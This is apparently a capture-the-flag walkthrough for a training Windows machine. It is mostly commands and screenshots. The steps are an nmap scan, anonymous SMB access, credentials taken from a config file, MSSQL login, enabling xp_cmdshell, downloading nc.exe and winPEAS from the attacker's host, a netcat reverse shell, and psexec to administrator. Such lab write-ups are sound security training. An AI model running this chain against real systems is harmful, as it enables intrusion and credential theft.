# 1.Port Scan
ip=10.129.55.151
`nmap -sC -sV &ip` 

![76a009021391df5df47607fe182f0552.png](../_resources/76a009021391df5df47607fe182f0552.png)

# 2.smbclient Search
`smbclient -N -L  \\\\$ip\\`

![076a7846b0b14ae9c7291a413dd76ff4.png](../_resources/076a7846b0b14ae9c7291a413dd76ff4.png)

# 3.ID&Password Get
`smbclient -N \\\\$ip\\backups`

`cat prod.dtsConfig`

![f725d5a74739368a9998e37be55f3551.png](../_resources/f725d5a74739368a9998e37be55f3551.png)

# 4.cmdshell
`usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc@$ip -windows-auth`

**> enable_xp_cmdshell;**
**> RECONFIGURE;**
**> xp_cmdshell"whoami"**

![555696cb467ff8c5bc99a464ad6f8fcb.png](../_resources/555696cb467ff8c5bc99a464ad6f8fcb.png)

**> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.8/nc.exe -outfile nc.exe"**

![ebd5a609c32334870e463d97d8aa5742.png](../_resources/ebd5a609c32334870e463d97d8aa5742.png)

`sudo python3 -m http.server 80`

![467333a2733eb54ac0b92a2305be27c5.png](../_resources/467333a2733eb54ac0b92a2305be27c5.png)

`nc -lvnp 4444`

![7aae1e0d19d1d6886bbb36abf037eefc.png](../_resources/7aae1e0d19d1d6886bbb36abf037eefc.png)

**SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.16.8 4444"**

![16b0441cafb4fe81789b820cf0760cf6.png](../_resources/16b0441cafb4fe81789b820cf0760cf6.png)

# 5.User.txt Get

![07c5d8af53fd6a4850d3e1e05396b977.png](../_resources/07c5d8af53fd6a4850d3e1e05396b977.png)

# 6.powershell

**> powershell**
**> wget http://10.10.16.8/winPEASx64.exe -outfile winpeasx64.exe**
**> dir**
![61210cd6bfd3a78b363e2aa06a2fa219.png](../_resources/61210cd6bfd3a78b363e2aa06a2fa219.png)

![0e24d40ff0e5342c6207426ecb4ac2db.png](../_resources/0e24d40ff0e5342c6207426ecb4ac2db.png)

# 7.Root.txt Get

**/usr/bin/impacket-psexec administrator@$ip**

**> whoami**
**> cd ..**
**> cd Users**
**>cd Administrator**
**>cd Desktop**
**> dir**
**> > type.root.txt**

![8206eacb0e6ecdf33599199daa8f0040.png](../_resources/8206eacb0e6ecdf33599199daa8f0040.png)
